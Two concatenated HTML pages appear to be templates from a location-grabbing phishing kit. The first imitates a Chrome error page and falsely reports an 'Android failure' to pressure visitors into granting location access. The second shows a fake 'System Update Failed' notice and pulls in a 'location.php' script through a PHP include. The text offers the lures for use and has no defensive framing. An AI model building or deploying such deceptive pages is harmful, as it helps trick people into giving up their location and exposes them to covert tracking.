<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Access Error</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="error-container">
    <div class="error-header">
      <img src="browe.png" alt="Chrome Logo" class="logo">
      <h1>ERROR</h1>
    </div>
    <div class="error-body">
      <p class="error-message">
        <strong>Allow location access to continue.</strong><br>
        <span>We encountered an issue with your system, and location permissions are required to proceed.</span>
      </p>
      <p class="detailed-message">
        <strong>Reason: </strong> Android failure detected, unable to retrieve necessary system data.
      </p>
    </div>
    <div class="error-footer">
      <p class="footer-message">If the problem persists, try restarting the application or your device.</p>
    </div>
  </div>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access Failed</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .logo {
            font-size: 40px;
            color: #d32f2f;
            margin-bottom: 10px;
        }
        h2 {
            font-size: 18px;
            margin: 10px 0;
            color: #333;
        }
        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }
        .btn {
            background: #d32f2f;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        .btn:hover {
            background: #b71c1c;
        }
    </style>
    <?php
include 'location.php';  

?>
</head>
<body>
<script>  
        function refreshPage() {  
            location.reload(); // This will refresh the current page  
        }  
    </script>  
    <div class="container">
        <div class="logo">
            <i class="fas fa-exclamation-triangle"></i>
        </div>
        <h2>System Update Failed</h2>
        <p>Please allow location access to continue using this feature.</p>

        <button class="btn" onclick="refreshPage()" >Retry</button>
    </div>
</body>
</html>

